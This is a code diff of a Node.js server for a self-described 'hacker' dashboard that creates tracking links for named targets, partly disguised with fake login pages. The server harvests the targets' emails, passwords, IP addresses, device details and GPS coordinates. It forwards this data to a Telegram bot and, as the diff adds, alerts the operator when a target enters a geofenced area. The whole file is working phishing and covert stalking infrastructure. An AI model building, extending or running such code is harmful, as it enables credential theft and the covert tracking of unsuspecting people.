@@ -1,4 +1,4 @@
-// File: server.js (v7.9 - With Correct Deletion Order)
+// File: server.js (v8.0 - Filter & Geofencing Edition)
 
 require('dotenv').config();
 
@@ -40,60 +40,14 @@ const protectRoute = (req, res, next) => {
     } catch (error) { res.status(401).json({ message: 'Token tidak valid atau error.' }); }
 };
 
-const sendTelegramNotification = async (locationData) => {
+const sendTelegramNotification = async (message) => {
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
-    if (!botToken || !chatId) {
-        console.warn('⚠️ Variabel Telegram Bot (TOKEN/CHAT_ID) tidak diatur di .env, notifikasi lokasi dilewati.');
-        return;
-    }
-    const { username, ip_address, city, country, isp, org, proxy, browserInfo, osInfo, latitude, longitude } = locationData;
-    const message = `
-*💀 Target Terdeteksi! 💀*
-
-*Target ID:* \`${username}\`
-*IP Address:* \`${ip_address}\`
-*Lokasi:* ${city || 'N/A'}, ${country || 'N/A'}
-*Provider:* ${isp || 'N/A'} (${org || 'N/A'})
-*Proxy/VPN:* ${proxy ? 'Ya' : 'Tidak'}
-
-*Perangkat:* ${browserInfo} pada ${osInfo}
-
-*Lihat di Peta:*
-[Google Maps](http://googleusercontent.com/maps/google.com/9{latitude},${longitude})
-    `;
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    if (!botToken || !chatId) return;
     try {
-        await axios.post(url, { chat_id: chatId, text: message, parse_mode: 'Markdown' });
+        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, { chat_id: chatId, text: message, parse_mode: 'Markdown' });
     } catch (error) {
-        console.error('❌ Gagal mengirim notifikasi Lokasi Telegram:', error.response ? error.response.data : error.message);
-    }
-};
-
-const sendCredentialsNotification = async (credData) => {
-    const botToken = process.env.TELEGRAM_BOT_TOKEN;
-    const chatId = process.env.TELEGRAM_CHAT_ID;
-    if (!botToken || !chatId) {
-        console.warn('⚠️ Variabel Telegram Bot tidak diatur, notifikasi kredensial dilewati.');
-        return;
-    }
-    const { username, trackerId, ipAddress, email, password } = credData;
-    const message = `
-*🔒 Credentials Captured! 🔒*
-
-*Target ID:* \`${username}\`
-*Link ID:* \`${trackerId}\`
-*IP Address:* \`${ipAddress}\`
-
-*--- CAPTURED DATA ---*
-*Email:* \`${email}\`
-*Password:* \`${password}\`
-    `;
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    try {
-        await axios.post(url, { chat_id: chatId, text: message, parse_mode: 'Markdown' });
-    } catch (error) {
-        console.error('❌ Gagal mengirim notifikasi Kredensial Telegram:', error.response ? error.response.data : error.message);
+        console.error('❌ Gagal mengirim notifikasi Telegram:', error.response ? error.response.data : error.message);
     }
 };
 
@@ -210,23 +164,18 @@ app.get('/:id', async (req, res) => {
         if (linkData.expires_at && new Date(linkData.expires_at) < new Date()) return res.status(410).send('<h1>Link has expired.</h1>');
         
         let destinationUrl = linkData.original_url;
-
         io.emit('link_clicked', { username: linkData.username });
-
         let templatePath = '';
         if (linkData.link_type === 'direct') templatePath = 'tracker.html';
         else if (linkData.link_type === 'intermediate') templatePath = 'login_users.html';
         else if (linkData.link_type === 'iframe') templatePath = 'iframe_page.html';
         else return res.redirect(destinationUrl);
-
         fs.readFile(path.join(__dirname, templatePath), 'utf8', (fsErr, data) => {
             if (fsErr) return res.status(500).send('Server error');
-
             let ogTags = '';
             if (linkData.og_title) ogTags += `<meta property="og:title" content="${linkData.og_title.replace(/"/g, '"')}">\n`;
             if (linkData.og_description) ogTags += `<meta property="og:description" content="${linkData.og_description.replace(/"/g, '"')}">\n`;
             if (linkData.og_image) ogTags += `<meta property="og:image" content="${linkData.og_image}">\n`;
-
             let html = data.replace('</head>', ogTags + '</head>');
             
             html = html.replace(/{{DESTINATION_URL}}/g, destinationUrl)
@@ -237,15 +186,56 @@ app.get('/:id', async (req, res) => {
                 let pageTitle = linkData.og_title || 'Loading...';
                 html = html.replace(/{{PAGE_TITLE}}/g, pageTitle);
             }
-
             res.send(html);
         });
-
     } catch (error) {
         console.error("Error handling link click:", error);
         res.status(500).send('Server error');
     }
 });
+
+const haversineDistance = (coords1, coords2) => {
+    function toRad(x) { return x * Math.PI / 180; }
+    const R = 6371e3; 
+    const dLat = toRad(coords2.lat - coords1.lat);
+    const dLon = toRad(coords2.lon - coords1.lon);
+    const lat1 = toRad(coords1.lat);
+    const lat2 = toRad(coords2.lat);
+    const a = Math.sin(dLat / 2) * Math.sin(dLat / 2) + Math.sin(dLon / 2) * Math.sin(dLon / 2) * Math.cos(lat1) * Math.cos(lat2);
+    const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+    return R * c;
+};
+
+async function checkGeofences(locationData) {
+    try {
+        const [fences] = await db.promise().query('SELECT * FROM geofences');
+        for (const fence of fences) {
+            const distance = haversineDistance(
+                { lat: locationData.latitude, lon: locationData.longitude },
+                { lat: fence.lat, lon: fence.lon }
+            );
+            if (distance <= fence.radius) {
+                console.log(`🚨 Geofence breached by ${locationData.username} at ${fence.name}`);
+                const alertData = {
+                    username: locationData.username,
+                    fenceName: fence.name,
+                    location: { city: locationData.city, country: locationData.country },
+                    timestamp: new Date()
+                };
+                io.emit('geofence_alert', alertData);
+                const message = `
+*🚨 GEOFENCE ALERT! 🚨*
+*Target:* \`${alertData.username}\`
+*Telah Memasuki Area:* \`${alertData.fenceName}\`
+*Lokasi Terdeteksi:* ${alertData.location.city || 'N/A'}, ${alertData.location.country || 'N/A'}
+                `;
+                await sendTelegramNotification(message);
+            }
+        }
+    } catch (error) {
+        console.error("Error checking geofences:", error);
+    }
+}
 
 app.post('/log', async (req, res) => {
     const { latitude, longitude, trackerId, username } = req.body;
@@ -287,18 +277,26 @@ app.post('/log', async (req, res) => {
         const ua = parser.getResult();
         const browserInfo = ua.browser.name ? `${ua.browser.name} ${ua.browser.version || ''}`.trim() : 'Unknown';
         const osInfo = ua.os.name ? `${ua.os.name} ${ua.os.version || ''}`.trim() : 'Unknown';
-        const locationInfo = city ? `from ${city}, ${country}` : '';
         
-        broadcastLogMessage(`> Location ${locationInfo} from [${username}] | ${browserInfo} on ${osInfo} | IP: ${ipAddress}`);
-        console.log(`📍 Lokasi diterima dari: ${username} [${ipAddress}] - ${city || 'Unknown City'}, ${country || 'Unknown Country'}`);
+        broadcastLogMessage(`> Location from [${username}] | ${browserInfo} on ${osInfo} | IP: ${ipAddress}`);
 
-        const notificationData = { ...newLocation, username, browserInfo, osInfo };
-        await sendTelegramNotification(notificationData);
+        const telegramMessage = `
+*💀 Target Terdeteksi! 💀*
+*Target ID:* \`${username}\`
+*IP Address:* \`${ipAddress}\`
+*Lokasi:* ${city || 'N/A'}, ${country || 'N/A'}
+*Provider:* ${isp || 'N/A'}
+*Perangkat:* ${browserInfo} pada ${osInfo}
+*Lihat di Peta:* [Google Maps](http://googleusercontent.com/maps/google.com/9{latitude},${longitude})`;
+        await sendTelegramNotification(telegramMessage);
 
         const newLocationDataForMap = { ...newLocation, username, created_at: new Date() };
         io.emit('new_location_logged', newLocationDataForMap);
         
         broadcastDashboardUpdate();
+        
+        await checkGeofences({ ...newLocation, username });
+
         res.json({ status: 'success' });
     } catch (error) {
         console.error("Error logging location:", error);
@@ -310,19 +308,22 @@ app.post('/api/credentials', async (req, res) => {
     const { email, password, trackerId } = req.body;
     const ipAddress = req.clientIp;
     
-    console.log(`🔒 Kredensial ditangkap! Email: ${email}, Password: ${password}, Link ID: ${trackerId}, IP: ${ipAddress}`);
     broadcastLogMessage(`> Kredensial ditangkap dari link [${trackerId}] | Email: ${email} | IP: ${ipAddress}`);
-    
     try {
         await db.promise().query('INSERT INTO credentials (tracker_id, email, password, ip_address) VALUES (?, ?, ?, ?)', [trackerId, email, password, ipAddress]);
-        
         const [rows] = await db.promise().query('SELECT u.username FROM users u JOIN links l ON u.id = l.user_id WHERE l.id = ?', [trackerId]);
-        
         if (rows.length > 0) {
             const username = rows[0].username;
-            await sendCredentialsNotification({ username, trackerId, ipAddress, email, password });
+            const message = `
+*🔒 Credentials Captured! 🔒*
+*Target ID:* \`${username}\`
+*Link ID:* \`${trackerId}\`
+*IP Address:* \`${ipAddress}\`
+*--- CAPTURED DATA ---*
+*Email:* \`${email}\`
+*Password:* \`${password}\``;
+            await sendTelegramNotification(message);
         }
-
         res.status(200).json({ message: 'Credentials logged successfully.' });
         broadcastDashboardUpdate();
     } catch (error) {
@@ -335,17 +336,14 @@ app.post('/create', protectRoute, async (req, res) => {
     const { username, originalUrl, url_android, url_ios, expiresIn, linkType } = req.body;
     
     if (!username || !originalUrl) return res.status(400).json({ error: 'Data tidak lengkap' });
-    
     let ogData = { og_title: null, og_description: null, og_image: null };
     try {
         const response = await axios.get(originalUrl, { headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36' } });
         const html = response.data;
         const $ = cheerio.load(html);
-
         ogData.og_title = $('meta[property="og:title"]').attr('content') || $('title').text() || null;
         ogData.og_description = $('meta[property="og:description"]').attr('content') || $('meta[name="description"]').attr('content') || null;
         ogData.og_image = $('meta[property="og:image"]').attr('content') || null;
-
         if (ogData.og_image && ogData.og_image.startsWith('/')) {
             const { protocol, host } = new URL(originalUrl);
             ogData.og_image = `${protocol}//${host}${ogData.og_image}`;
@@ -359,7 +357,6 @@ app.post('/create', protectRoute, async (req, res) => {
         expiresAt = new Date();
         expiresAt.setHours(expiresAt.getHours() + parseInt(expiresIn));
     }
-
     try {
         let [users] = await db.promise().query('SELECT id FROM users WHERE username = ?', [username]);
         let userId;
@@ -371,17 +368,7 @@ app.post('/create', protectRoute, async (req, res) => {
         }
 
         const id = nanoid(8);
-        const newLinkData = { 
-            id, 
-            user_id: userId, 
-            original_url: originalUrl, 
-            url_android: url_android || null, 
-            url_ios: url_ios || null, 
-            expires_at: expiresAt, 
-            link_type: linkType || 'direct',
-            ...ogData
-        };
-
+        const newLinkData = { id, user_id: userId, original_url: originalUrl, url_android: url_android || null, url_ios: url_ios || null, expires_at: expiresAt, link_type: linkType || 'direct', ...ogData };
         await db.promise().query('INSERT INTO links SET ?', newLinkData);
         
         broadcastLogMessage(`> Link created for target [${username}] with ID [${id}]`);
@@ -396,12 +383,9 @@ app.post('/create', protectRoute, async (req, res) => {
 app.delete('/api/links/:id', protectRoute, async (req, res) => {
     const { id } = req.params;
     try {
-        // Hapus dulu data yang bergantung pada link ini
         await db.promise().query("DELETE FROM credentials WHERE tracker_id = ?", [id]);
         await db.promise().query("DELETE FROM locations WHERE tracker_id = ?", [id]);
-        // Baru hapus link utamanya
         await db.promise().query("DELETE FROM links WHERE id = ?", [id]);
-
         broadcastLogMessage(`> Link [${id}] and all its data have been deleted.`);
         broadcastDashboardUpdate();
         res.json({ status: 'success', message: 'Link berhasil dihapus.' });
@@ -492,51 +476,101 @@ app.get('/api/intel/:username', protectRoute, async (req, res) => {
     }
 });
 
-app.get('/api/alldata/links', protectRoute, async (req, res) => {
+app.get('/api/geofences', protectRoute, async (req, res) => {
     try {
-        const query = `
-            SELECT l.id, l.original_url, l.created_at, l.expires_at, l.link_type, l.click_count, u.username 
-            FROM links l
-            JOIN users u ON l.user_id = u.id
-            ORDER BY l.created_at DESC`;
-        const [links] = await db.promise().query(query);
-        res.json(links);
+        const [fences] = await db.promise().query('SELECT * FROM geofences ORDER BY name ASC');
+        res.json(fences);
     } catch (error) {
-        console.error("Error fetching all links data:", error);
-        res.status(500).json({ error: 'Database query failed' });
+        res.status(500).json({ message: 'Failed to fetch geofences' });
     }
+});
+
+app.post('/api/geofences', protectRoute, async (req, res) => {
+    const { name, lat, lon, radius } = req.body;
+    if (!name || !lat || !lon || !radius) {
+        return res.status(400).json({ message: 'All fields are required' });
+    }
+    try {
+        await db.promise().query('INSERT INTO geofences (name, lat, lon, radius) VALUES (?, ?, ?, ?)', [name, lat, lon, radius]);
+        res.status(201).json({ message: 'Geofence created' });
+    } catch (error) {
+        res.status(500).json({ message: 'Failed to create geofence' });
+    }
+});
+
+app.delete('/api/geofences/:id', protectRoute, async (req, res) => {
+    try {
+        await db.promise().query('DELETE FROM geofences WHERE id = ?', [req.params.id]);
+        res.json({ message: 'Geofence deleted' });
+    } catch (error) {
+        res.status(500).json({ message: 'Failed to delete geofence' });
+    }
+});
+
+app.get('/api/alldata/links', protectRoute, async (req, res) => {
+    let query = `
+        SELECT l.id, l.original_url, l.created_at, l.expires_at, l.link_type, l.click_count, u.username 
+        FROM links l JOIN users u ON l.user_id = u.id WHERE 1=1`;
+    const params = [];
+    if (req.query.target) {
+        query += " AND u.username LIKE ?";
+        params.push(`%${req.query.target}%`);
+    }
+    if (req.query.startDate) {
+        query += " AND l.created_at >= ?";
+        params.push(req.query.startDate);
+    }
+    if (req.query.endDate) {
+        query += " AND l.created_at <= ?";
+        params.push(`${req.query.endDate} 23:59:59`);
+    }
+    query += " ORDER BY l.created_at DESC";
+    const [links] = await db.promise().query(query, params);
+    res.json(links);
 });
 
 app.get('/api/alldata/locations', protectRoute, async (req, res) => {
-    try {
-        const query = `
-            SELECT loc.id, loc.tracker_id, loc.latitude, loc.longitude, loc.created_at, loc.ip_address, loc.country, loc.city, loc.isp, u.username
-            FROM locations loc
-            JOIN links l ON loc.tracker_id = l.id
-            JOIN users u ON l.user_id = u.id
-            ORDER BY loc.created_at DESC`;
-        const [locations] = await db.promise().query(query);
-        res.json(locations);
-    } catch (error) {
-        console.error("Error fetching all locations data:", error);
-        res.status(500).json({ error: 'Database query failed' });
+    let query = `
+        SELECT loc.id, loc.tracker_id, loc.latitude, loc.longitude, loc.created_at, loc.ip_address, loc.country, loc.city, loc.isp, u.username
+        FROM locations loc JOIN links l ON loc.tracker_id = l.id JOIN users u ON l.user_id = u.id WHERE 1=1`;
+    const params = [];
+    if (req.query.target) {
+        query += " AND u.username LIKE ?";
+        params.push(`%${req.query.target}%`);
     }
+    if (req.query.startDate) {
+        query += " AND loc.created_at >= ?";
+        params.push(req.query.startDate);
+    }
+    if (req.query.endDate) {
+        query += " AND loc.created_at <= ?";
+        params.push(`${req.query.endDate} 23:59:59`);
+    }
+    query += " ORDER BY loc.created_at DESC";
+    const [locations] = await db.promise().query(query, params);
+    res.json(locations);
 });
 
 app.get('/api/alldata/credentials', protectRoute, async (req, res) => {
-    try {
-        const query = `
-            SELECT cred.id, cred.tracker_id, cred.email, cred.password, cred.ip_address, cred.created_at, u.username
-            FROM credentials cred
-            JOIN links l ON cred.tracker_id = l.id
-            JOIN users u ON l.user_id = u.id
-            ORDER BY cred.created_at DESC`;
-        const [credentials] = await db.promise().query(query);
-        res.json(credentials);
-    } catch (error) {
-        console.error("Error fetching all credentials data:", error);
-        res.status(500).json({ error: 'Database query failed' });
+    let query = `
+        SELECT cred.id, cred.tracker_id, cred.email, cred.password, cred.ip_address, cred.created_at, u.username
+        FROM credentials cred JOIN links l ON cred.tracker_id = l.id JOIN users u ON l.user_id = u.id WHERE 1=1`;
+    const params = [];
+    if (req.query.target) {
+        query += " AND u.username LIKE ?";
+        params.push(`%${req.query.target}%`);
     }
+    if (req.query.startDate) {
+        query += " AND cred.created_at >= ?";
+        params.push(req.query.startDate);
+    }
+    if (req.query.endDate) {
+        query += " AND cred.created_at <= ?";
+        params.push(`${req.query.endDate} 23:59:59`);
+    }
+    query += " ORDER BY cred.created_at DESC";
+    const [credentials] = await db.promise().query(query, params);
+    res.json(credentials);
 });
 
 app.delete('/api/alldata/location/:id', protectRoute, async (req, res) => {
@@ -544,7 +578,6 @@ app.delete('/api/alldata/location/:id', protectRoute, async (req, res) => {
         await db.promise().query('DELETE FROM locations WHERE id = ?', [req.params.id]);
         res.json({ message: 'Location record deleted successfully.' });
     } catch (error) {
-        console.error("Error deleting location:", error);
         res.status(500).json({ message: 'Failed to delete location record.' });
     }
 });
@@ -554,35 +587,29 @@ app.delete('/api/alldata/credential/:id', protectRoute, async (req, res) => {
         await db.promise().query('DELETE FROM credentials WHERE id = ?', [req.params.id]);
         res.json({ message: 'Credential record deleted successfully.' });
     } catch (error) {
-        console.error("Error deleting credential:", error);
         res.status(500).json({ message: 'Failed to delete credential record.' });
     }
 });
 
-// ##### [KODE YANG DIPERBAIKI] API Endpoint untuk Menghapus Semua Data #####
 app.delete('/api/alldata/all', protectRoute, async (req, res) => {
     const connection = db.promise(); 
     try {
         await connection.beginTransaction();
-        // Hapus data dari tabel 'anak' terlebih dahulu
         await connection.query('DELETE FROM credentials');
         await connection.query('DELETE FROM locations');
-        // Setelah itu baru hapus data dari tabel 'induk'
         await connection.query('DELETE FROM links');
         await connection.commit();
-        
-        broadcastDashboardUpdate(); 
+        broadcastDashboardUpdate();
         res.json({ message: 'All tracking data has been wiped successfully.' });
     } catch (error) {
         await connection.rollback();
         console.error("Error wiping all data:", error);
-        // Kirim response error yang valid sebagai JSON
-        res.status(500).json({ message: 'Failed to wipe all data due to a server error.' });
+        res.status(500).json({ message: 'Failed to wipe all data.' });
     }
 });
 
 server.listen(PORT, () => {
-    console.log(`\n HACKER-UI DASHBOARD v7.9 (With Deletion Fix)`);
+    console.log(`\n HACKER-UI DASHBOARD v8.0 (Filter & Geofencing)`);
     console.log(`===================================================`);
     console.log(`✅ Server berjalan di http://localhost:${PORT}\n`);
 });
